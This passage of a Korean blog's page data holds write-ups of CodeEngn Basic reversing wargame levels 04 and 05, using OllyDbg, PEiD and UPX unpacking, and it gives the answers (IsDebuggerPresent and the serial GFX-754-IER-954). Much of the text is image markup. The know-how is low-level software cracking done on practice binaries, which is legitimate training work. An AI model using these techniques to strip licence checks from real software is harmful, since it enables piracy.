class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 76.36363636363637%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABJElEQVR42mPIaW+qnTopvCwvub48rroksa48oaY0vakqvqY0tqo4rroEJF5VnFxfEVtVnFRXDhEPK8nxzEpiiC0vTK4p9c1IDMvPDM1LDyvIDMpJiyjICi/ICs5NCyvIiinJDc5JiyjKjijKiSzICspJDc3P8MtMdIgLYzC3sdXQ1hCREGdgZmJmZ2NiY2VmZwWREAQRYWNlYmMBi7Mws7Mxs7OycLCzc3EymJhb6OlqCwoKMTAwMDIyMpAETC0sdXW0BIXAmpmYGBgZSUBmllbaWpoCAgLk2GxsZq6lpSEoKEiOZnMrKwN9XSEhsvxsZmmpo60pSJ5mE3MLLQ11Mv1sbmWtr6tDprP1DI00NdTItFlUXJyBgYGJVG0wzWLk2Em5ZgADGkFpbTbFcwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/2b8c99388abe677e18f78a393128f4ff/c9b55/0.webp 165w,\n/static/2b8c99388abe677e18f78a393128f4ff/60360/0.webp 290w\"\n              sizes=\"(max-width: 290px) 100vw, 290px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/2b8c99388abe677e18f78a393128f4ff/04c57/0.png 165w,\n/static/2b8c99388abe677e18f78a393128f4ff/139a5/0.png 290w\"\n            sizes=\"(max-width: 290px) 100vw, 290px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/2b8c99388abe677e18f78a393128f4ff/139a5/0.png\"\n            alt=\"exe\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>우선 프로그램을 실행시켜 보면, 정상이라는 텍스트가 반복되어서 나오는 것을 볼 수 있다.</p>\n<p>이제 올리디버거를 통해 이 프로그램을 실행시키면 다음과 같은 화면을 볼 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 274px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 73.93939393939394%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABfElEQVR42pWQS0/CQBSFp0SWRmg7vAoUGHQ65akG5aESZG8MLg1EVhpjjH/ZlRgWfTFDmYIxrTHGFeVbnLO5J+feC94/Pmfz+ZIx07IopbZj25ZtGIZpmosAx7Zt23Ec3xeUWqYZTC4YY2BmGBZdfG02bsByybz1mnO+Wq18dTmjlHOPc+66LqPMdV1v7Xke99YeGN+Pn58ep9OH0Wg0GU9eXt/ubm/6/f5wOLz+Y/DPB4NABkCSZFQqFQtqXBRVVdXrTSm2DwAQBAFsJZ8rNOu1arWSSqUwxr3LfiYpA0GIRqN72wCKkms2apqGZRkihFrtLhRjYZvVfLFW1XWdQJjAGLfa3YQUDxvOpLPVCtHwEYQQoXKr3UtIoZvTaaWiE0I0WZbLqHzW6e3QrKrF42adEBw0Iz8c/mYlk60QjRANQujffN5JyqGbs0qu4X/MfxhCqHNxtcPayUTq6LCMUEmMi4VCsXFyKsUPwoYjkYjg86O+gd34DQg7Jr8Bf/+haz448U0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6dc6eb7d0be4472cef96f91a8a0bb07e/c9b55/1.webp 165w,\n/static/6dc6eb7d0be4472cef96f91a8a0bb07e/c6d10/1.webp 274w\"\n              sizes=\"(max-width: 274px) 100vw, 274px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6dc6eb7d0be4472cef96f91a8a0bb07e/04c57/1.png 165w,\n/static/6dc6eb7d0be4472cef96f91a8a0bb07e/d3fa7/1.png 274w\"\n            sizes=\"(max-width: 274px) 100vw, 274px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6dc6eb7d0be4472cef96f91a8a0bb07e/d3fa7/1.png\"\n            alt=\"check_debugtool\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>프로그램의 처음부터, “디버깅 당함”이라는 문자열이 뜨기 시작하는 부분의 함수를 찾았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 512px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 9.090909090909092%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAdUlEQVR42mNIVTWWlnCUkXWWlraVlbMR4jRncovjjEqQ1bBlkVVhlFZk5NBgYtBnZtZnYtJjZNRjYNBFoCgNU0kxcxVVFwuLEFUVGwYGRQWXcDX/MCUdcwktFXYpFS4+LR5uA3YOTR5efTY2TQYGJQYGZQgCANJeDpdCPEzvAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/75ea36a65670099c41a90c350b134b7d/c9b55/2.webp 165w,\n/static/75ea36a65670099c41a90c350b134b7d/f2908/2.webp 330w,\n/static/75ea36a65670099c41a90c350b134b7d/bd5dd/2.webp 512w\"\n              sizes=\"(max-width: 512px) 100vw, 512px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/75ea36a65670099c41a90c350b134b7d/04c57/2.png 165w,\n/static/75ea36a65670099c41a90c350b134b7d/d9ecf/2.png 330w,\n/static/75ea36a65670099c41a90c350b134b7d/01e7c/2.png 512w\"\n            sizes=\"(max-width: 512px) 100vw, 512px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/75ea36a65670099c41a90c350b134b7d/01e7c/2.png\"\n            alt=\"find function\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>이 함수로 내부로 진입한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.90909090909091%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAcElEQVR42iXLzQqCQBQG0E/S7nfvzAhBydgobgQhf94jWkUQRPT+rxHq7mwOUkrTPLXnS3y8mt9nWFrXeXHizZmakKamqko55MLClxkc4IECQKzr2zh2VRXvz/R99/N1z2brIRlCWE3mWz5lKLd8BP6CGQizRMk1kgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0fa5a0669b45297ac3b19e2813ce0f43/c9b55/3.webp 165w,\n/static/0fa5a0669b45297ac3b19e2813ce0f43/f2908/3.webp 330w,\n/static/0fa5a0669b45297ac3b19e2813ce0f43/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0fa5a0669b45297ac3b19e2813ce0f43/04c57/3.png 165w,\n/static/0fa5a0669b45297ac3b19e2813ce0f43/d9ecf/3.png 330w,\n/static/0fa5a0669b45297ac3b19e2813ce0f43/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0fa5a0669b45297ac3b19e2813ce0f43/32056/3.png\"\n            alt=\"isdebuggerpresent\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>디버깅을 탐지하는 것으로 보이는 함수 이름이 코멘트로 달려있는 것을 확인할 수 있다.</p>\n<p>정답: IsDebuggerPresent</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"848fadeb-aef9-584c-9490-16c26824cd7d","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-04/","title":"CodeEngn Basic 04","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#e8e8e8","images":{"fallback":{"src":"/static/a221b1329b21ba384a4f3046de995205/e74ac/0.png","srcSet":"/static/a221b1329b21ba384a4f3046de995205/c7491/0.png 74w,\n/static/a221b1329b21ba384a4f3046de995205/ec6d5/0.png 147w,\n/static/a221b1329b21ba384a4f3046de995205/e74ac/0.png 294w","sizes":"(min-width: 294px) 294px, 100vw"},"sources":[{"srcSet":"/static/a221b1329b21ba384a4f3046de995205/21fa2/0.webp 74w,\n/static/a221b1329b21ba384a4f3046de995205/a4023/0.webp 147w,\n/static/a221b1329b21ba384a4f3046de995205/ac828/0.webp 294w","type":"image/webp","sizes":"(min-width: 294px) 294px, 100vw"}]},"width":660,"height":399.59183673469386}}}},"body":"<p>이 프로그램의 등록키는 무엇인가</p>\n<p>프로그램을 실행시키면 다음과 같은 창이 뜬다. 등록키로 인증받는 프로그램으로 보인다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 294px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACgUlEQVR42hXPW0/TYACA4f4vE08XXhshkkFCRI1BMXJQ0OCFiRjkPAcbzE03DnMRgxpCQoJIVAiDtqOHtbRdu7Zfu/Zru7STrSMii2B29949eZHmvq7AQHdT34Om3vuBge62pz3Xuztv9j9qH3zc1Nt1o6fz2r32y7dbr95tu3ir5VJH4FJH4Mqd1gvtzS1PHiLR5fRIdLZ/eOhFKDiZiE0l4iPR8PPx18OzM5Pv304l42Px2Wdjw4OTIxPJ+KvZ6aHI9MtIKLiUCH9YQM7P6x8XYpHgWDoRTb0Lf04vpBaXQsGpL19XV5bTkXAkFp2bGB+dGB9dW1tLLSbn55Mrn5brp3UDmkh6DyZ2YCoDk9tG7Iee3lFVoHqeZ0JIkKRcKMiywbCawBscr4mijmMi0KyqXy2oKjKT+TuNnsWzZ6G9f2/2z+cyx6f105OTP8WiwbKsIssA2BxnMIzOc4aYhzxnOk7Z96sKAIgsCgYoKJJQVGWJZ3VFFKVCpXIkFySOEw5ZlmVYoNokoTFMkSI1joe1ml+r1VQNIIqi6LqhAWCaZl4QVEUFmu77vmVZEELLgqYJDcNspGWZhmnbDoQQmlCSZaRy9NuCFoRWqVRyXc9xnEqlWi57PMtRJM0whxRJ4yiO7eMkQdNULpejM7sZkqAESUJsC2IYimFZjuNFUeQ43nU9z3UlUWSZHEPTbI7mWAZDMRzHFUUWBIFlDk0TqrqGOLbdcCF0SiXbtqFRVBTVK5dlSSNwicjyFJEnDgSKEnOUpAHn+Ljm+41noOsIjqEoiqMYRpAUnj3Yy+z+/LUNdIBhzuqqt7HpbXxz19fdze/u1pa7veNYdoOybDtfKPwHT4j7SI98w4YAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a221b1329b21ba384a4f3046de995205/c9b55/0.webp 165w,\n/static/a221b1329b21ba384a4f3046de995205/456a1/0.webp 294w\"\n              sizes=\"(max-width: 294px) 100vw, 294px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a221b1329b21ba384a4f3046de995205/04c57/0.png 165w,\n/static/a221b1329b21ba384a4f3046de995205/04a86/0.png 294w\"\n            sizes=\"(max-width: 294px) 100vw, 294px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a221b1329b21ba384a4f3046de995205/04a86/0.png\"\n            alt=\"crackmev3.0\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>PEiD라는 프로그램을 통해 이 프로그램에 대한 정보를 구해보도록 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 350px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 57.57575757575757%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACZElEQVR42jXRW08TQRTA8f1q4IvE+GK8AE9FTcSAiejX8U3BCEqhUOSqLyTQdrftbvcy0+1eZndm9jJ7mWnhxVZjWvT3cPJ/Ozk50uONN082Vp+9W7v/qjK3snTv+fLdnF9Znv8XS3OVxbnK4sJq5cHai4frLxderzx9v/7o7apU+3GxUz/Yrte2atWPuzub+9Uvh7XNvd2taex/qn7b2q9+/V6vXZzunZ9Uz473zo73zk92jg4+bH+WhiUnIfZdj4QYeQi5PsXEsQe+4wae77suQQEvyt/j8Z/J5Pd4Mvk1nown/sBtyrKECYmThDGGMcaElCXnnIuhEEJwIYqypDTChCRpijFOU5bPFHmuAyAZhmn3bc/1FFlWFCWK46IoeMnLshRCxHEKITRNMwyxaRhBGGYzBGOl25Usy4IAIhT0NE3talmW8f+EEIxlfXtgWRZCCAKo67plgZSxJE46PU2ybdtxPc/1nIGTZXmWZ2VR3uGcM8YAgBDAIAggAKZpOY7DOaeEKJoqRVGUJAlLWZZlNzc3o5lpzJrzklJ6d22apBGNkiQdDocZYz3LlIIgDBCiNCKEhFM4QAGEfcdxfd8nlPq+F4Y4DEOEEOeiLIo8z4di2HcdSdM0Xdc9z7dtW9d1CPsAAMMwNVXrdLq+j4BlAQAVWQYAJkma5znGuCwKsw+ltqKoqjZwXJamhmFMdw6c29tbz/N6PZ1G0Wg0yhjTVI3SKI5jSmmj0fBct62p0mH98Pj0tH50dHV93e50ZEWRlXazNftbu91qtZpyq9lqyW3FtKwQY90wr5qNrqr+vLz8C0XhTaZFy6R3AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/99607e6143a3a07a197ae0ae92f56292/c9b55/1.webp 165w,\n/static/99607e6143a3a07a197ae0ae92f56292/f2908/1.webp 330w,\n/static/99607e6143a3a07a197ae0ae92f56292/a3432/1.webp 350w\"\n              sizes=\"(max-width: 350px) 100vw, 350px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/99607e6143a3a07a197ae0ae92f56292/04c57/1.png 165w,\n/static/99607e6143a3a07a197ae0ae92f56292/d9ecf/1.png 330w,\n/static/99607e6143a3a07a197ae0ae92f56292/13ae7/1.png 350w\"\n            sizes=\"(max-width: 350px) 100vw, 350px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/99607e6143a3a07a197ae0ae92f56292/13ae7/1.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>EP Section에 UPX1이라는 것이 있다(다른 프로그램은 .text였음). 이는 어떤 패킹 방식인데, PE 파일 압축기이며, 파일 크기를 줄이며 내부 코드와 리소스를 감추기 위한 목적으로 사용된다. 파일 내부에 압축 해제 코드를 포함하고 있기 때문에 실행되는 순간 압축 해제가 일어난다.</p>\n<p>UPX패킹은 코드 맨 마지막에 OEP(Original entry point)로 가는 JMP문이 있다. 진짜 코드를 따로 저장할 수 있으나 편리한 툴을 이용해 UPX 언패킹을 하도록 한다.\r\n다음은 이 프로그램을 올리디버거로 열었을 때의 처음 화면이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 498px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.454545454545457%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA/klEQVR42mWNSUvDUBSF731pnFowE7xM7yVmqDaDxqQVEjWERIRiWkFcuXfXnf9AkNJ/LTFLPw5n9R0O7A+H/c/3drNbrj6rclfXX4H/sYi2L+suLt71/JUue3rXU6OndIhpvqnqWpI2svwM1f1jkiwUhbmuG0VhWRZxFBgsCuZxlsbM0Q1DM02NWZRzi/PzLJva1gTgFACh6Z7y2xtFsT0vcFxXFEUAnF65rE28lOoXIHFBkAU8IQSJIAiIQAgizhAJ1E2bXaeqYofhpapIgAAAxoNPKxVmQCRADYD+PQ0gjAacDdW03arIVY37wfz4aDIqgZc7JhtcHNX/DONfI6Qgtg4KaOQAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c64bdcc0709e6908ad18cae965eb836a/c9b55/2.webp 165w,\n/static/c64bdcc0709e6908ad18cae965eb836a/f2908/2.webp 330w,\n/static/c64bdcc0709e6908ad18cae965eb836a/71ce1/2.webp 498w\"\n              sizes=\"(max-width: 498px) 100vw, 498px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c64bdcc0709e6908ad18cae965eb836a/04c57/2.png 165w,\n/static/c64bdcc0709e6908ad18cae965eb836a/d9ecf/2.png 330w,\n/static/c64bdcc0709e6908ad18cae965eb836a/79e1b/2.png 498w\"\n            sizes=\"(max-width: 498px) 100vw, 498px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c64bdcc0709e6908ad18cae965eb836a/79e1b/2.png\"\n            alt=\"pushad\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>UPX라는 CLI 도구를 사용한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 575px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.060606060606062%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAvklEQVR42lWO0W6DMAxFb+yEgJ0CSZxRdbCijf7/L06wl/X4PNwrWbIxTXPSVHIZy6Sjaxv0Qfmr5GeeH7k+re61fBetKfSBAuE/nBgdEAAGCpABBW5AvXICZsCuOgIe57JcKuD74NiN02jFRARA3/e1VGI36GDNiElESi0A6JrzzJ8+hGZt/Vw1qZlt66aqx88hIs3a63ilk9v+3FWEmd/e/lju92WZLnwIIgMRxRiZ2XsfYyQmIuq6jpzDO7+/9gqb4sKZOAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7e56019c83f9635cabdf2bbb2269538d/c9b55/3.webp 165w,\n/static/7e56019c83f9635cabdf2bbb2269538d/f2908/3.webp 330w,\n/static/7e56019c83f9635cabdf2bbb2269538d/039fe/3.webp 575w\"\n              sizes=\"(max-width: 575px) 100vw, 575px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7e56019c83f9635cabdf2bbb2269538d/04c57/3.png 165w,\n/static/7e56019c83f9635cabdf2bbb2269538d/d9ecf/3.png 330w,\n/static/7e56019c83f9635cabdf2bbb2269538d/59415/3.png 575w\"\n            sizes=\"(max-width: 575px) 100vw, 575px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7e56019c83f9635cabdf2bbb2269538d/59415/3.png\"\n            alt=\"runupx\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>언패킹 이후 올리디버거로 다시 열어보면, 익숙한 시작 코드가 뜨는 것을 볼 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 22.424242424242426%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAxElEQVR42m3CTU+DQBAA0GF2lpRkyTZAYAeo8iHRFhigtRoPHmo8aIwJ8f//GOPV9OXBun5P0+vhcOFsDNOlv/zc7vde5DBj3DApJiqJKiImyv8FkZG5EhkXeYjq+2b9KCTOznF8tAlb9DwABPDhqsfzabe7G/q5a2pbtt3XZyt1PpauZ8cOPQRQiAH+UYhKa19rn8hXSsO8zEXRDMP08vyUd0P7/laIiyTeztvkJtFKAWCaluxcXVXWWmNMGIbGmGAT/ALatxUiSPEZZgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/cbbee6580537ecd9ce531b27ebe0800f/c9b55/4.webp 165w,\n/static/cbbee6580537ecd9ce531b27ebe0800f/f2908/4.webp 330w,\n/static/cbbee6580537ecd9ce531b27ebe0800f/ff4b8/4.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/cbbee6580537ecd9ce531b27ebe0800f/04c57/4.png 165w,\n/static/cbbee6580537ecd9ce531b27ebe0800f/d9ecf/4.png 330w,\n/static/cbbee6580537ecd9ce531b27ebe0800f/32056/4.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/cbbee6580537ecd9ce531b27ebe0800f/32056/4.png\"\n            alt=\"find string\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>시리얼 키를 빨리 찾기 위해, 문자열을 골라서 보았다(Search for – All referenced text strings).</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 39.3939393939394%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABmklEQVR42m2Qy07bUBCG55zjtFyUq6I0SpRQH8el4MsJOM6JE8d222VdYRKEKycIeAQWSO0z9C3CAnYIpGQD3VWKGqSKPQLRPkkVLypF6qd/M6PR/P8MfPv+azT+eTaZjSZ35zf3F7f3lz8eJnd/xrPf49nz1fTxevp0PX2Ky0VNH+Dk9MsgGgbB3if/Y7/f7+32fN/3PM91HdfxOLdNs8GbPO4s4DgO7IfRVt2QZbUmSZSKsABBsIQRIITgvwwPj9pWR9ONVststy0qvhYIxhhhjBAilUpNrtG1tWq5VCoWXwkJgRAcaz4AnwdHbcvVWYtz7rkf3nnvCRZiTwKQkGWm62xzQ62zbca2V5ZXY0cEgAEIhNFX04xULeTNsGsfWq0IYwagI9ABmCQFirKjaX1VCXQtyGadXM5Lp+0XLxsY1yGMhoZhqJrBudF1bM91EgKZL5+fieU3KmMq501F2ahWSqJYrVbK2UwylVqdx44Oji2ro6gGbzZsu2t3OtlMWhCEOB4ulSmV6Pr6WyrSfD5fKBRSyeS/h/0Fhkdn9twhwWMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/55e8995c42faf7870bb93e1fdc3d264f/c9b55/5.webp 165w,\n/static/55e8995c42faf7870bb93e1fdc3d264f/f2908/5.webp 330w,\n/static/55e8995c42faf7870bb93e1fdc3d264f/ff4b8/5.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/55e8995c42faf7870bb93e1fdc3d264f/04c57/5.png 165w,\n/static/55e8995c42faf7870bb93e1fdc3d264f/d9ecf/5.png 330w,\n/static/55e8995c42faf7870bb93e1fdc3d264f/32056/5.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/55e8995c42faf7870bb93e1fdc3d264f/32056/5.png\"\n            alt=\"search referenced text strings\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>시리얼 키를 볼 수 있다.</p>\n<p>정답: GFX-754-IER-954</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"c55caaf5-1c7a-5303-afe0-3041aa665966","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-05/","title":"CodeEngn Basic 05","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/76b1ed89ad4ec691f84f41fe79870e2b/61ca3/0.png","srcSet":"/static/76b1ed89ad4ec691f84f41fe79870e2b/58d72/0.png 164w,\n/static/76b1ed89ad4ec691f84f41fe79870e2b/f398b/0.png 328w,\n/static/76b1ed89ad4ec691f84f41fe79870e2b/61ca3/0.png 655w","sizes":"(min-width: 655px) 655px, 100vw"},"sources":[{"srcSet":"/static/76b1ed89ad4ec691f84f41fe79870e2b/c335d/0.webp 164w,\n/static/76b1ed89ad4ec691f84f41fe79870e2b/f58de/0.webp 328w,\n/static/76b1ed89ad4ec691f84f41fe79870e2b/65b52/0.webp 655w","type":"image/webp","sizes":"(min-width: 655px) 655px, 100vw"}]},"width":660,"height":400.03053435114504}}}},"body":"<p>HDD를 CD-Rom으로 인식시키기 위해서는 GetDriveTypeA의 리턴값이 무엇이 되어야 하는가</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 655px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 47.27272727272727%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABj0lEQVR42k2Q3Y6bMBSExw4EaowDYYEYcAIkYEJJ0/w1oZF2VfWmvWikSn2Jff8XqEhW7X4aWTry+Iw1+Hm7bbbPurlu2+/26ceozZE9QUdwIkJjIPC8dl0cm/KU55/zfOf7teMUnC8JifG6P3wt6vmqOG467/ef8SVGBWiCDMQDAPfDpPNFySzLHBGCfxp4ufTrepMkCUDUeTnTMWxAEPCHhWCY30P+a3c4lmWjlAJovVmoRhKbgmPQw0tsSuloZIzNAfIWeme33xeFrrVu69Y7bI2OIwea4fHDJ0SYp2mhlJQyjCLXdTl3GWPD7eXSV6u2+diuVDn+dTaOAhlQAwrEGLYLN9BJkkfRNAg8z2eMGYZhmialFPv7t/W66XRr9T3dukPyGnBB6JAcTGW9WGRhFIWhKwaYwxhjtm3jcDjN58tK19+uL8HrjX1JWGVxzZ2OO5ljcXv6FD+vqk9SpmnCGLu3QN7Ovr/O1TJNExln4hxM5MRlwvN9f+L5U1/4YmyLcDaLpEykNE3zffF/AfIrKRFIEIKXAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/76b1ed89ad4ec691f84f41fe79870e2b/c9b55/0.webp 165w,\n/static/76b1ed89ad4ec691f84f41fe79870e2b/f2908/0.webp 330w,\n/static/76b1ed89ad4ec691f84f41fe79870e2b/09ab1/0.webp 655w\"\n              sizes=\"(max-width: 655px) 100vw, 655px\"\n              type=\"image/webp\"\n            />\n          <source\n            